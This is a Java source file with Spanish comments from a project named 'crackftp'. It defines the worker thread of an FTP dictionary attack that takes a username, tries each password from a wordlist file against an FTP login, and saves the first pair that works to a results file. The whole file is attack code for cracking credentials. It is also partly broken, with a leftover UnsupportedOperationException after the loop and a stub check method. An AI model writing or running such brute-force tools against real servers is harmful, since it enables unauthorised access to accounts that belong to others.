/*
 Esta clase tiene el comportamiento de cada hilo
 */
package crackftp;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Hilo implements Runnable{
    
    private String usuario;
    private BufferedReader claves;
    
    public Hilo(String usuario, String fclaves){
        this.usuario = usuario;
        try {
            this.claves = new BufferedReader(new FileReader(fclaves));
        } catch (FileNotFoundException ex) {
            System.out.println("No se ha encontrado el fichero indicado");
            Logger.getLogger(Hilo.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    
    // Metodo run al que llamaremos para realizar las comprobaciones de las diferentes claves
    @Override
    public void run() {
        //Creamos la siguiente objeto para dejar el resultado en un fichero
        BufferedWriter bw = null;
        
        try {
            String linea = "";
            while((linea = this.claves.readLine()) != null){
                Ftp f = new Ftp(this.usuario, linea);
                if(f.autenticar()){
                    //imprimimos el usuario y contraseña por patanlla y lo metemos en un fichero
                    bw = new BufferedWriter(new FileWriter("restultado.txt"));
                    bw.write("usuario: " + this.usuario + " clave: " + linea);
                    bw.newLine();
                    bw.flush();
                    System.out.println("");
                    break;
                }
                
                f.cerrarConexion();
            }
            
            throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
        } catch (IOException ex) {
            Logger.getLogger(Hilo.class.getName()).log(Level.SEVERE, null, ex);
        }finally{
            if(bw != null){
                try {
                    bw.close();
                } catch (IOException ex) {
                    Logger.getLogger(Hilo.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        }
    }
    
    public boolean realizarComprobacion(String clave){
        
        return false;  
        
    }
}
